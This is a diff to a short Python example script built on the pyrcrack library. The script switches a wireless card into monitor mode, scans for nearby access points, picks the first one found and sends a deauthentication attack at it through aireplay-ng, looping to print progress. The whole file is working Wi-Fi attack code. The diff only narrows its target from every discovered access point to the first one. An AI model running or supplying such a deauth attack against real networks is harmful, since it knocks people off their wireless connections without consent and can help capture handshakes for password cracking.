@@ -1,5 +1,6 @@
 """Deauth"""
 import sys
+from contextlib import suppress
 import asyncio
 import pyrcrack
 
@@ -9,9 +10,10 @@ async def attack(interface, apo):
     async with pyrcrack.AirmonNg() as airmon:
         await airmon.set_monitor(interface['interface'], apo.channel)
         async with pyrcrack.AireplayNg() as aireplay:
-            await aireplay.run(
-                interface['interface'], deauth=sys.argv[1], D=True)
-            print(await aireplay.proc.communicate())
+            await aireplay.run(interface['interface'], deauth=10, D=True)
+            while True:
+                print(aireplay.meta)
+                await asyncio.sleep(2)
 
 
 async def deauth():
@@ -22,10 +24,14 @@ async def deauth():
 
         async with pyrcrack.AirodumpNg() as pdump:
             await pdump.run(interface['interface'], write_interval=1)
+            # Extract first results
             while True:
-                await asyncio.sleep(3)
-                for apo in pdump.sorted_aps():
-                    await attack(interface, apo)
+                with suppress(KeyError):
+                    await asyncio.sleep(2)
+                    ap = pdump.sorted_aps()[0]
+                    break
+            # Deauth.
+            await attack(interface, ap)
 
 
 asyncio.run(deauth())
